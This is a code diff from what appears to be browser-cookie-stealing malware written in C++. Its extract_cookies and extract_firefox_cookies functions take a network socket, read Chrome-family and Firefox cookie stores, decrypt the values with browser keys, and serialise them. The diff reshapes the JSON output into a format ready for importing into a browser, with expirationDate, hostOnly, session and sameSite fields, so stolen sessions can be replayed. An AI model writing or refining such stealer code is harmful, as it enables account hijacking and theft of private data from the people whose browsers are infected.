@@ -609,7 +609,7 @@ void extract_cookies(SOCKET sock, const fs::path& profile_path, const std::strin
                 const char* host = (const char*)sqlite3_column_text(stmt, 0); const char* name = (const char*)sqlite3_column_text(stmt, 1);
                 const char* value = (const char*)sqlite3_column_text(stmt, 2); const uint8_t* blob_ptr = (const uint8_t*)sqlite3_column_blob(stmt, 3);
                 int blob_size = sqlite3_column_bytes(stmt, 3);
-                const char* path = (const char*)sqlite3_column_text(stmt, 4); long long expires = sqlite3_column_int64(stmt, 5);
+                const char* path = (const char*)sqlite3_column_text(stmt, 4); long long expires_utc = sqlite3_column_int64(stmt, 5);
                 int secure = sqlite3_column_int(stmt, 6); int httponly = sqlite3_column_int(stmt, 7);
 
                 std::vector<uint8_t> dec = decrypt_blob(std::vector<uint8_t>(blob_ptr, blob_ptr + blob_size), v10_key, v20_key, is_opera);
@@ -618,16 +618,27 @@ void extract_cookies(SOCKET sock, const fs::path& profile_path, const std::strin
                     std::string str_name = name ? name : "";
                     std::string str_host = host ? host : "";
                     std::string str_path = path ? path : "";
-                    oss_txt << str_name << "=" << cookie_val << "\n";
+
+                    // Convert Chrome time (microseconds since Jan 1, 1601) to Unix time (seconds since Jan 1, 1970)
+                    double expirationDate = 0;
+                    if (expires_utc > 0) {
+                        expirationDate = (double)(expires_utc - 11644473600000000ULL) / 1000000.0;
+                    }
+
+                    oss_txt << str_name << "=" << cookie_val << ";";
                     if (!first) oss_json << ",\n";
                     oss_json << "  {\n";
                     oss_json << "    \"name\": \"" << json_escape(str_name) << "\",\n";
                     oss_json << "    \"value\": \"" << json_escape(cookie_val) << "\",\n";
                     oss_json << "    \"domain\": \"" << json_escape(str_host) << "\",\n";
                     oss_json << "    \"path\": \"" << json_escape(str_path) << "\",\n";
-                    oss_json << "    \"expires\": " << expires << ",\n";
+                    if (expirationDate > 0) oss_json << "    \"expirationDate\": " << (long long)expirationDate << ",\n";
+                    oss_json << "    \"hostOnly\": " << (str_host.size() > 0 && str_host[0] != '.' ? "true" : "false") << ",\n";
+                    oss_json << "    \"httpOnly\": " << (httponly ? "true" : "false") << ",\n";
                     oss_json << "    \"secure\": " << (secure ? "true" : "false") << ",\n";
-                    oss_json << "    \"httpOnly\": " << (httponly ? "true" : "false") << "\n";
+                    oss_json << "    \"session\": " << (expires_utc == 0 ? "true" : "false") << ",\n";
+                    oss_json << "    \"sameSite\": \"unspecified\",\n";
+                    oss_json << "    \"storeId\": \"0\"\n";
                     oss_json << "  }";
                     first = false;
                 }
@@ -776,16 +787,21 @@ void extract_firefox_cookies(SOCKET sock, const fs::path& profile_path, const st
 
                 std::string str_name = name ? name : ""; std::string str_val = value ? value : "";
                 std::string str_host = host ? host : ""; std::string str_path = path ? path : "";
-                oss_txt << str_name << "=" << str_val << "\n";
+
+                oss_txt << str_name << "=" << str_val << ";";
                 if (!first) oss_json << ",\n";
                 oss_json << "  {\n";
                 oss_json << "    \"name\": \"" << json_escape(str_name) << "\",\n";
                 oss_json << "    \"value\": \"" << json_escape(str_val) << "\",\n";
                 oss_json << "    \"domain\": \"" << json_escape(str_host) << "\",\n";
                 oss_json << "    \"path\": \"" << json_escape(str_path) << "\",\n";
-                oss_json << "    \"expires\": " << expiry << ",\n";
+                if (expiry > 0) oss_json << "    \"expirationDate\": " << expiry << ",\n";
+                oss_json << "    \"hostOnly\": " << (str_host.size() > 0 && str_host[0] != '.' ? "true" : "false") << ",\n";
+                oss_json << "    \"httpOnly\": " << (httponly ? "true" : "false") << ",\n";
                 oss_json << "    \"secure\": " << (secure ? "true" : "false") << ",\n";
-                oss_json << "    \"httpOnly\": " << (httponly ? "true" : "false") << "\n";
+                oss_json << "    \"session\": " << (expiry == 0 ? "true" : "false") << ",\n";
+                oss_json << "    \"sameSite\": \"unspecified\",\n";
+                oss_json << "    \"storeId\": \"0\"\n";
                 oss_json << "  }";
                 first = false;
             }
